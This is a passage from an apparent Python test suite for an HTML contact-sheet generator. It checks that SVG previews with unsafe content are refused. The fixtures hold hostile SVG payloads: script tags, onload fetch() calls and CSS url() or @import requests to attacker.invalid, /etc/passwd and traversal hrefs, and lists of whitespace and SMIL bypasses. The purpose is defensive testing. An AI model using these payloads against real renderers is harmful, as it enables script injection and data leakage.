            rc_strict = main([
                "--workspace", str(td),
                "--output", str(out_path),
                "--strict",
            ])
        ok = rc_normal == 0 and rc_strict == 1
        results.append(_scenario(
            "--strict promotes WARN to non-zero exit",
            ok,
            f"rc_normal={rc_normal}, rc_strict={rc_strict}",
        ))

    # The test assertions below focus on the **security property**:
    # the produced HTML must not contain any href / src / xlink:href
    # attribute whose value carries a URI scheme — those are what would
    # trigger a network fetch when the contact sheet is opened. A
    # rejected URL appearing as plain TEXT inside a fallback <div> is
    # inert (no fetch) and acceptable, so we don't require the URL
    # string to be entirely absent from the HTML — only that it never
    # appears in a fetchable position.
    fetchable_attr_re = re.compile(
        r'(?:href|src|xlink:href)\s*=\s*"(?:https?|file|ftp|s3|data)[^"]*"',
        re.IGNORECASE,
    )

    # 20. HTML output refuses to inline an SVG with a remote <image
    #     href="https://attacker..."> reference. The attacker URL must
    #     NOT appear in any href/src attribute in the produced HTML,
    #     and the slide's card must carry the "SVG not embedded"
    #     fallback notice. The URL may legitimately appear as plain
    #     text inside the fallback notice — that's diagnostic content,
    #     not a fetch.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        attacker_url = "https://attacker.invalid/leak.png"
        unsafe_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">'
            f'<image x="0" y="0" width="100" height="100" href="{attacker_url}"/>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(unsafe_svg, encoding="utf-8")
        out_path = Path(raw_td) / "report.html"
        report = inspect_workspace(td)
        _write_html_report(report, out_path, td)
        text = out_path.read_text()
        ok = (
            not fetchable_attr_re.search(text)
            and "SVG not embedded" in text
            and "unsafe reference attribute" in text
        )
        results.append(_scenario(
            "HTML output: remote <image href> in SVG refused (no fetchable URL in HTML, fallback shown)",
            ok,
            f"fetchable_attr_match={bool(fetchable_attr_re.search(text))}, "
            f"fallback_shown={'SVG not embedded' in text}",
        ))

    # 21. HTML output refuses to inline an SVG carrying a <script>
    #     element. The literal "<script" substring must NOT appear in
    #     the produced HTML.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        unsafe_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">'
            '<script>alert(1)</script>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(unsafe_svg, encoding="utf-8")
        out_path = Path(raw_td) / "report.html"
        report = inspect_workspace(td)
        _write_html_report(report, out_path, td)
        text = out_path.read_text()
        # The fallback message escapes the tag name, so the bare
        # "<script" substring must not appear anywhere — the
        # reason inside the notice carries HTML-escaped angle
        # brackets ("&lt;script&gt;"), not a live tag.
        ok = (
            "<script" not in text
            and "alert(1)" not in text
            and "SVG not embedded" in text
        )
        results.append(_scenario(
            "HTML output: <script> in SVG is refused (no <script in HTML, fallback shown)",
            ok,
            f"script_tag_in_html={'<script' in text}, "
            f"alert_in_html={'alert(1)' in text}, "
            f"fallback_shown={'SVG not embedded' in text}",
        ))

    # 22. HTML output refuses an SVG with an on-load event-handler
    #     attribute. The attacker payload must not appear in the HTML.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        attacker_call = "fetch('https://attacker.invalid/x')"
        unsafe_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}" '
            f'onload="{attacker_call}">'
            '<rect x="0" y="0" width="10" height="10" fill="red"/>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(unsafe_svg, encoding="utf-8")
        out_path = Path(raw_td) / "report.html"
        report = inspect_workspace(td)
        _write_html_report(report, out_path, td)
        text = out_path.read_text()
        ok = (
            "onload=" not in text
            and "fetch(" not in text
            and "attacker.invalid" not in text
            and "SVG not embedded" in text
            and "event-handler" in text
        )
        results.append(_scenario(
            "HTML output: onload= event handler in SVG refused (no onload= in HTML, fallback shown)",
            ok,
            f"onload_in_html={'onload=' in text}, "
            f"fetch_in_html={'fetch(' in text}, "
            f"fallback_shown={'SVG not embedded' in text}",
        ))

    # 23. HTML output refuses an SVG with a <style> element (CSS
    #     execution vector — @import / expression / behavior). The
    #     contact sheet's own <head><style> CSS block is legitimate
    #     and is unaffected; what we must NOT see is the SVG's
    #     @import url(...) payload, and the slide's card must carry
    #     the fallback notice.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        unsafe_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">'
            '<style>@import url("https://attacker.invalid/x.css");</style>'
            '<rect x="0" y="0" width="10" height="10" fill="red"/>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(unsafe_svg, encoding="utf-8")
        out_path = Path(raw_td) / "report.html"
        report = inspect_workspace(td)
        _write_html_report(report, out_path, td)
        text = out_path.read_text()
        ok = (
            "@import" not in text
            and "attacker.invalid" not in text
            and "SVG not embedded" in text
            and not fetchable_attr_re.search(text)
        )
        results.append(_scenario(
            "HTML output: <style> in SVG refused (no @import / no fetchable URL in HTML, fallback shown)",
            ok,
            f"import_in_html={'@import' in text}, "
            f"fetchable_attr_match={bool(fetchable_attr_re.search(text))}, "
            f"fallback_shown={'SVG not embedded' in text}",
        ))

    # 24. HTML output refuses an SVG with a style= attribute on an
    #     element. CSS via inline style can also fetch remote URLs
    #     via background-image: url(...).
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        unsafe_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">'
            '<rect x="0" y="0" width="10" height="10" '
            'style="background-image:url(https://attacker.invalid/x.png)"/>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(unsafe_svg, encoding="utf-8")
        out_path = Path(raw_td) / "report.html"
        report = inspect_workspace(td)
        _write_html_report(report, out_path, td)
        text = out_path.read_text()
        ok = (
            "attacker.invalid" not in text
            and "background-image" not in text
            and "SVG not embedded" in text
        )
        results.append(_scenario(
            "HTML output: style= attribute in SVG refused (no inline CSS in HTML, fallback shown)",
            ok,
            f"attacker_in_html={'attacker.invalid' in text}, "
            f"bg_image_in_html={'background-image' in text}, "
            f"fallback_shown={'SVG not embedded' in text}",
        ))

    # 25. Direct unit-test of the safety check: every safe-SVG-detector
    #     positive (a happy-path SVG generated by _good_svg_for) parses
    #     and returns root != None.
    rm_for_safe = _good_render_model(1, "cover")
    safe_root, safe_reason = _svg_safety_check(_good_svg_for(rm_for_safe))
    ok = safe_root is not None and safe_reason == ""
    results.append(_scenario(
        "safety check: clean SVG accepted",
        ok,
        f"reason={safe_reason!r}",
    ))

    # 26. Direct unit-test: an SVG whose root is not <svg> in the SVG
    #     namespace is refused.
    not_svg = '<foo xmlns="urn:bar"></foo>'
    rejected_root, rejected_reason = _svg_safety_check(not_svg)
    ok = rejected_root is None and "root element" in rejected_reason
    results.append(_scenario(
        "safety check: non-SVG root refused",
        ok,
        f"reason={rejected_reason!r}",
    ))

    # 27. Protocol-relative href ("//host/path"). A browser opening the
    #     contact sheet will resolve this against the page's protocol
    #     and fetch from the remote host — exactly the failure mode
    #     the contract is supposed to prevent. The bare URI-scheme
    #     regex MISSES this case (no leading scheme), so we rely on
    #     local_path_is_safe to refuse it. The fallback notice must
    #     be present and the produced HTML must contain no fetchable
    #     attribute pointing at the attacker host.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        attacker_host = "attacker.invalid"
        unsafe_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">'
            f'<image x="0" y="0" width="100" height="100" href="//{attacker_host}/leak.png"/>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(unsafe_svg, encoding="utf-8")
        out_path = Path(raw_td) / "report.html"
        report = inspect_workspace(td)
        _write_html_report(report, out_path, td)
        text = out_path.read_text()
        # Protocol-relative URLs would fetch over the contact sheet's
        # protocol; they must never appear as a value of href/src/xlink:href
        # in the produced HTML.
        proto_rel_attr_re = re.compile(
            r'(?:href|src|xlink:href)\s*=\s*"//[^"]*"',
            re.IGNORECASE,
        )
        ok = (
            not proto_rel_attr_re.search(text)
            and "SVG not embedded" in text
            and "protocol-relative" in text  # diagnostic mentions the rule
        )
        results.append(_scenario(
            "HTML output: protocol-relative <image href=\"//host/...\"> refused "
            "(no //host attribute in HTML, fallback shown)",
            ok,
            f"proto_rel_match={bool(proto_rel_attr_re.search(text))}, "
            f"fallback_shown={'SVG not embedded' in text}",
        ))

    # 28. POSIX-absolute href ("/etc/passwd"). When the HTML opens on
    #     file://, the browser resolves "/" relative to the filesystem
    #     root, which would leak arbitrary local files. Refuse.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        unsafe_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">'
            '<image x="0" y="0" width="100" height="100" href="/etc/passwd"/>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(unsafe_svg, encoding="utf-8")
        out_path = Path(raw_td) / "report.html"
        report = inspect_workspace(td)
        _write_html_report(report, out_path, td)
        text = out_path.read_text()
        abs_path_attr_re = re.compile(
            r'(?:href|src|xlink:href)\s*=\s*"/[^"]*"',
            re.IGNORECASE,
        )
        ok = (
            not abs_path_attr_re.search(text)
            and "SVG not embedded" in text
        )
        results.append(_scenario(
            "HTML output: POSIX-absolute <image href=\"/etc/passwd\"> refused "
            "(no /-rooted attribute in HTML, fallback shown)",
            ok,
            f"abs_path_match={bool(abs_path_attr_re.search(text))}, "
            f"fallback_shown={'SVG not embedded' in text}",
        ))

    # 29. Path-traversal href ("../etc/passwd"). The contact sheet
    #     lives outside the workspace; a '..' segment could let an
    #     inline-SVG <image> reach arbitrary files relative to the
    #     HTML host's base directory.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        unsafe_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">'
            '<image x="0" y="0" width="100" height="100" href="../../etc/passwd"/>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(unsafe_svg, encoding="utf-8")
        out_path = Path(raw_td) / "report.html"
        report = inspect_workspace(td)
        _write_html_report(report, out_path, td)
        text = out_path.read_text()
        traversal_attr_re = re.compile(
            r'(?:href|src|xlink:href)\s*=\s*"[^"]*\.\.[^"]*"',
            re.IGNORECASE,
        )
        ok = (
            not traversal_attr_re.search(text)
            and "SVG not embedded" in text
        )
        results.append(_scenario(
            "HTML output: path-traversal <image href=\"../..\"> refused "
            "(no .. in any href attribute in HTML, fallback shown)",
            ok,
            f"traversal_match={bool(traversal_attr_re.search(text))}, "
            f"fallback_shown={'SVG not embedded' in text}",
        ))

    # 30. Leading-backslash href ("\\\\foo"). Windows-style absolute
    #     reference; refused for the same reason as POSIX-absolute.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        unsafe_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">'
            '<image x="0" y="0" width="100" height="100" href="\\\\share\\leak"/>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(unsafe_svg, encoding="utf-8")
        out_path = Path(raw_td) / "report.html"
        report = inspect_workspace(td)
        _write_html_report(report, out_path, td)
        text = out_path.read_text()
        backslash_attr_re = re.compile(
            r'(?:href|src|xlink:href)\s*=\s*"\\[^"]*"',
            re.IGNORECASE,
        )
        ok = (
            not backslash_attr_re.search(text)
            and "SVG not embedded" in text
        )
        results.append(_scenario(
            "HTML output: leading-backslash <image href=\"\\\\share\\...\"> refused "
            "(no \\-rooted attribute in HTML, fallback shown)",
            ok,
            f"backslash_match={bool(backslash_attr_re.search(text))}, "
            f"fallback_shown={'SVG not embedded' in text}",
        ))

    # 31. Empty href value. Not a security risk on its own, but
    #     local_path_is_safe refuses it; documenting that the safety
    #     check is consistent with the rest of the repo's gates.
    empty_href_svg = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        f'<svg xmlns="{SVG_NS}" viewBox="0 0 100 100" width="100" height="100">'
        '<image x="0" y="0" width="50" height="50" href=""/>'
        '</svg>'
    )
    empty_root, empty_reason = _svg_safety_check(empty_href_svg)
    ok = empty_root is None and "unsafe reference attribute" in empty_reason
    results.append(_scenario(
        "safety check: empty href value refused",
        ok,
        f"reason={empty_reason!r}",
    ))

    # 32. Direct unit-tests of _svg_safety_check across the full local-
    #     path safety surface. Mirrors the workspace-path negatives in
    #     scripts/validate_workspace.py's tempfixture suite so the
    #     inline-SVG gate cannot drift away from the rest of the repo's
    #     fail-closed rules.
    unsafe_href_payloads = [
        ("https://attacker.invalid/x.png",     "URI scheme (https)"),
        ("http://attacker.invalid/x.png",      "URI scheme (http)"),
        ("file:///etc/passwd",                 "URI scheme (file)"),
        ("data:text/plain,leak",               "URI scheme (data)"),
        ("javascript:alert(1)",                "URI scheme (javascript)"),
        ("//attacker.invalid/x.png",           "protocol-relative"),
        ("/etc/passwd",                        "POSIX-absolute"),
        ("\\\\share\\leak",                    "leading backslash"),
        ("../../etc/passwd",                   "path traversal"),
        ("input/../source.md",                 "path traversal segment"),
        ("",                                   "empty string"),
    ]
    all_payloads_refused = True
    failure_details: list[str] = []
    for payload, label in unsafe_href_payloads:
        # Use ET.tostring-friendly escaping by emitting via a Python
        # f-string and letting the parser handle the bytes. None of
        # the payloads above contain '<' / '>' / '&' / quote chars
        # that would break the SVG XML, so direct substitution is
        # safe for this synthetic test.
        svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            f'<svg xmlns="{SVG_NS}" viewBox="0 0 100 100" '
            f'width="100" height="100">'
            f'<image x="0" y="0" width="50" height="50" href="{payload}"/>'
            '</svg>'
        )
        ret_root, ret_reason = _svg_safety_check(svg)
        if ret_root is not None:
            all_payloads_refused = False
            failure_details.append(
                f"payload {label!r} ({payload!r}) was accepted as safe"
            )
    results.append(_scenario(
        "safety check: full local-path safety surface (URI schemes, "
        "protocol-relative, POSIX-absolute, leading backslash, path "
        "traversal, empty) all refused on href attribute",
        all_payloads_refused,
        "; ".join(failure_details),
    ))

    # 33. Leading-whitespace bypass: " https://attacker.invalid/x".
    #     Browsers strip leading whitespace from URL attributes before
    #     resolving, so the local_path_is_safe URI-scheme regex (which
    #     is anchored at the start of the string and expects [A-Za-z],
    #     not whitespace) would NOT match the raw value and would
    #     erroneously accept it. The whitespace gate must refuse the
    #     value before that bypass is possible.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        unsafe_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">'
            '<image x="0" y="0" width="100" height="100" '
            'href=" https://attacker.invalid/leak.png"/>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(unsafe_svg, encoding="utf-8")
        out_path = Path(raw_td) / "report.html"
        report = inspect_workspace(td)
        _write_html_report(report, out_path, td)
        text = out_path.read_text()
        # Any href= attribute whose value (after the opening quote)
        # has leading whitespace and then a URI scheme, or whose value
        # carries the attacker host, must not appear in the produced
        # HTML in a fetchable position.
        # The security property: the attacker URL must not appear as
        # the VALUE of any href / src / xlink:href attribute in the
        # produced HTML — those are the only positions the browser
        # would treat as a URL and fetch. The URL legitimately appears
        # as quoted text inside the fallback notice's <div>, which is
        # inert (plain text, no fetch).
        all_attrs = re.findall(
            r'(?:href|src|xlink:href)\s*=\s*"([^"]*)"',
            text, re.IGNORECASE,
        )
        attacker_in_attr = any("attacker.invalid" in v for v in all_attrs)
        whitespace_attack_re = re.compile(
            r'(?:href|src|xlink:href)\s*=\s*"\s+(?:https?|file|ftp|s3|data)[^"]*"',
            re.IGNORECASE,
        )
        ok = (
            not whitespace_attack_re.search(text)
            and not attacker_in_attr
            and "SVG not embedded" in text
            and "surrounding whitespace" in text
        )
        results.append(_scenario(
            "HTML output: leading-whitespace URI bypass (\" https://attacker/x\") "
            "refused (no fetchable URL in HTML, fallback shown)",
            ok,
            f"whitespace_attack_match={bool(whitespace_attack_re.search(text))}, "
            f"attacker_in_attr_values={attacker_in_attr}, "
            f"fallback_shown={'SVG not embedded' in text}, "
            f"diagnostic_present={'surrounding whitespace' in text}",
        ))

    # 34. Direct unit-tests of _svg_safety_check across the
    #     whitespace-prefix bypass surface. Mirrors scenario #32's
    #     bundled enumeration but for the whitespace gate: leading
    #     space / tab / newline / carriage-return / Unicode NBSP
    #     before a URI scheme, before a '/', before a '\\', and
    #     before a '//'. Each must be refused.
    whitespace_payloads = [
        (" https://attacker.invalid/x.png",  "leading space + https"),
        ("\thttps://attacker.invalid/x.png", "leading tab + https"),
        ("\nhttps://attacker.invalid/x.png", "leading newline + https"),
        ("\rhttps://attacker.invalid/x.png", "leading carriage-return + https"),
        (" https://attacker.invalid/x.png", "leading NBSP + https"),
        (" //attacker.invalid/x.png",        "leading space + protocol-relative"),
        ("\t//attacker.invalid/x.png",       "leading tab + protocol-relative"),
        (" /etc/passwd",                     "leading space + POSIX-absolute"),
        ("\t/etc/passwd",                    "leading tab + POSIX-absolute"),
        (" \\\\share\\leak",                 "leading space + leading backslash"),
        ("assets/cover.svg ",                "trailing space on otherwise-safe path"),
        ("assets/cover.svg\t",               "trailing tab on otherwise-safe path"),
        ("assets/cover.svg\n",               "trailing newline on otherwise-safe path"),
        (" assets/cover.svg ",               "wrapping whitespace on otherwise-safe path"),
    ]
    all_whitespace_refused = True
    whitespace_failure_details: list[str] = []
    for payload, label in whitespace_payloads:
        # XML attribute values can carry whitespace literally — ET
        # preserves them — so direct substitution into the string
        # template is faithful.
        svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            f'<svg xmlns="{SVG_NS}" viewBox="0 0 100 100" '
            f'width="100" height="100">'
            f'<image x="0" y="0" width="50" height="50" href="{payload}"/>'
            '</svg>'
        )
        ret_root, ret_reason = _svg_safety_check(svg)
        if ret_root is not None:
            all_whitespace_refused = False
            whitespace_failure_details.append(
                f"payload {label!r} ({payload!r}) was accepted as safe"
            )
    results.append(_scenario(
        "safety check: whitespace-prefixed bypasses (leading/trailing "
        "space, tab, newline, CR, NBSP before/after scheme / '//' / "
        "'/' / '\\\\' / safe path) all refused on href attribute",
        all_whitespace_refused,
        "; ".join(whitespace_failure_details),
    ))

    # 35. CSS url(...) bypass: fill="url(https://attacker/x.svg#id)".
    #     Browsers fetch the external paint server resource. The
    #     attacker host must not appear in any href/src/xlink:href
    #     attribute in the produced HTML, and the fallback notice
    #     must surface the CSS url(...) diagnostic.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        unsafe_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">'
            '<rect x="0" y="0" width="100" height="100" '
            'fill="url(https://attacker.invalid/x.svg#id)"/>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(unsafe_svg, encoding="utf-8")
        out_path = Path(raw_td) / "report.html"
        report = inspect_workspace(td)
        _write_html_report(report, out_path, td)
        text = out_path.read_text()
        all_attrs = re.findall(
            r'(?:href|src|xlink:href)\s*=\s*"([^"]*)"',
            text, re.IGNORECASE,
        )
        attacker_in_attr = any("attacker.invalid" in v for v in all_attrs)
        # fill="url(...)" itself must not appear in the produced HTML
        # either, since the browser would interpret it on a real shape.
        fill_url_in_html = re.search(
            r'fill\s*=\s*"url\(', text, re.IGNORECASE,
        ) is not None
        ok = (
            not attacker_in_attr
            and not fill_url_in_html
            and "SVG not embedded" in text
            and "CSS url(...)" in text
        )
        results.append(_scenario(
            "HTML output: CSS url(...) in fill attribute refused "
            "(no fill=\"url(...\" in produced HTML, fallback shown)",
            ok,
            f"attacker_in_attr={attacker_in_attr}, "
            f"fill_url_in_html={fill_url_in_html}, "
            f"fallback_shown={'SVG not embedded' in text}",
        ))

    # 36. xml:base bypass on the <svg> root would rewrite the base
    #     URL used to resolve every relative href in the document.
    #     Refused outright.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        unsafe_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            'xml:base="https://attacker.invalid/" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">'
            '<image x="0" y="0" width="100" height="100" href="x.png"/>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(unsafe_svg, encoding="utf-8")
        out_path = Path(raw_td) / "report.html"
        report = inspect_workspace(td)
        _write_html_report(report, out_path, td)
        text = out_path.read_text()
        # xml:base= attribute must not survive into the produced HTML.
        xml_base_in_html = re.search(
            r'\bxml:base\s*=', text, re.IGNORECASE,
        ) is not None
        ok = (
            not xml_base_in_html
            and "SVG not embedded" in text
            and "xml:base" in text
        )
        results.append(_scenario(
            "HTML output: xml:base attribute on <svg> root refused "
            "(no xml:base= in HTML, fallback shown)",
            ok,
            f"xml_base_in_html={xml_base_in_html}, "
            f"fallback_shown={'SVG not embedded' in text}",
        ))

    # 37. SMIL <animate> can mutate an href attribute at runtime
    #     (attributeName="href" to="https://attacker/x"). Refuse the
    #     element outright — the static href gate cannot see runtime
    #     attribute mutation.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        unsafe_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">'
            '<image x="0" y="0" width="100" height="100" href="a.png">'
            '<animate attributeName="href" '
            'to="https://attacker.invalid/x.png"/>'
            '</image>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(unsafe_svg, encoding="utf-8")
        out_path = Path(raw_td) / "report.html"
        report = inspect_workspace(td)
        _write_html_report(report, out_path, td)
        text = out_path.read_text()
        animate_in_html = "<animate" in text
        all_attrs = re.findall(
            r'(?:href|src|xlink:href)\s*=\s*"([^"]*)"',
            text, re.IGNORECASE,
        )
        attacker_in_attr = any("attacker.invalid" in v for v in all_attrs)
        # The fallback notice HTML-escapes the angle brackets, so the
        # diagnostic appears as `&lt;animate&gt;` rather than literal
        # `<animate>`. Check for either form so a future change in
        # the escape-vs-quote rendering doesn't break the test.
        diagnostic_present = (
            "unsafe element" in text
            and ("&lt;animate&gt;" in text or "<animate>" in text.replace("&lt;", "<").replace("&gt;", ">"))
        )
        ok = (
            not animate_in_html
            and not attacker_in_attr
            and "SVG not embedded" in text
            and diagnostic_present
        )
        results.append(_scenario(
            "HTML output: <animate> element refused "
            "(no <animate in HTML, fallback shown, attacker URL absent)",
            ok,
            f"animate_in_html={animate_in_html}, "
            f"attacker_in_attr={attacker_in_attr}, "
            f"fallback_shown={'SVG not embedded' in text}, "
            f"diagnostic_present={diagnostic_present}",
        ))

    # 38. Direct unit-tests of _svg_safety_check across the new
    #     bypass surface (CSS url(...) on every fetch-capable
    #     presentation attribute, xml:base, every SMIL / filter
    #     timing element we added to the unsafe-tag set).
    new_bypass_payloads = [
        ('<svg xmlns="http://www.w3.org/2000/svg"><rect '
         'fill="url(https://attacker/x)"/></svg>',
         "fill url(https)"),
        ('<svg xmlns="http://www.w3.org/2000/svg"><rect '
         'stroke="url(//attacker/x)"/></svg>',
         "stroke url(//)"),
        ('<svg xmlns="http://www.w3.org/2000/svg"><rect '
         'mask="url(/abs/path/x)"/></svg>',
         "mask url(/abs)"),
        ('<svg xmlns="http://www.w3.org/2000/svg"><rect '
         'clip-path="url(http://attacker/x)"/></svg>',
         "clip-path url(http)"),
        ('<svg xmlns="http://www.w3.org/2000/svg"><rect '
         'filter="url(data:image/svg+xml,leak)"/></svg>',
         "filter url(data:)"),
        ('<svg xmlns="http://www.w3.org/2000/svg" '
         'cursor="url(http://attacker/x.png), auto"/>',
         "cursor url(http) on root"),
        ('<svg xmlns="http://www.w3.org/2000/svg"><path '
         'marker-start="url(https://attacker/m)"/></svg>',
         "marker-start url(https)"),
        ('<svg xmlns="http://www.w3.org/2000/svg" '
         'xml:base="https://attacker/"/>',
         "xml:base on root"),
        ('<svg xmlns="http://www.w3.org/2000/svg"><image href="a.png">'
         '<animate attributeName="href" to="https://attacker/x"/>'
         '</image></svg>',
         "<animate> element"),
        ('<svg xmlns="http://www.w3.org/2000/svg"><image href="a.png">'
         '<set attributeName="href" to="https://attacker/x"/>'
         '</image></svg>',
         "<set> element"),
        ('<svg xmlns="http://www.w3.org/2000/svg">'
         '<feImage href="https://attacker/x"/></svg>',
         "<feImage> element"),
        ('<svg xmlns="http://www.w3.org/2000/svg">'
         '<animateMotion path="M0,0 L10,10"/></svg>',
         "<animateMotion> element"),
        ('<svg xmlns="http://www.w3.org/2000/svg">'
         '<animateTransform attributeName="transform" '
         'type="translate" values="0;10"/></svg>',
         "<animateTransform> element"),
        ('<svg xmlns="http://www.w3.org/2000/svg">'
         '<discard begin="1s"/></svg>',
         "<discard> element"),
        ('<svg xmlns="http://www.w3.org/2000/svg">'
         '<mpath href="https://attacker/x"/></svg>',
         "<mpath> element"),
        # Sanity positive: a plain SVG with hex-only fill/stroke and
        # no url(...) / xml:base / SMIL element MUST still pass.
        ('<svg xmlns="http://www.w3.org/2000/svg">'
         '<rect x="0" y="0" width="100" height="100" '
         'fill="#FFFFFF" stroke="#1F3A5F"/>'
         '<text x="10" y="50" fill="#1A1A1A">hi</text>'
         '</svg>',
         "POSITIVE: hex-only fill/stroke accepted"),
    ]
    all_correct = True
    bypass_details: list[str] = []
    for svg, label in new_bypass_payloads:
        ret_root, ret_reason = _svg_safety_check(svg)
        should_be_positive = label.startswith("POSITIVE")
        if should_be_positive:
            if ret_root is None:
                all_correct = False
                bypass_details.append(
                    f"{label}: legitimate SVG was incorrectly refused: "
                    f"{ret_reason!r}"
                )
        else:
            if ret_root is not None:
                all_correct = False
                bypass_details.append(
                    f"{label}: unsafe SVG was accepted"
                )
    results.append(_scenario(
        "safety check: CSS url(...) on fill / stroke / mask / clip-path "
        "/ filter / cursor / marker-start, xml:base attribute, and "
        "every SMIL / filter element (<animate>, <set>, "
        "<animateMotion>, <animateTransform>, <discard>, <mpath>, "
        "<feImage>) refused; clean hex-only SVG still accepted",
        all_correct,
        "; ".join(bypass_details),
    ))

    # 39a. Case-variant element-name bypass: HTML5 parsers apply the
    #      SVG element-name adjustment table that maps every case
    #      variant (e.g. "foreignobject" / "FOREIGNOBJECT" /
    #      "foReiGnObJeCt") back to the canonical camelCase form
    #      before rendering. A case-sensitive comparison would miss
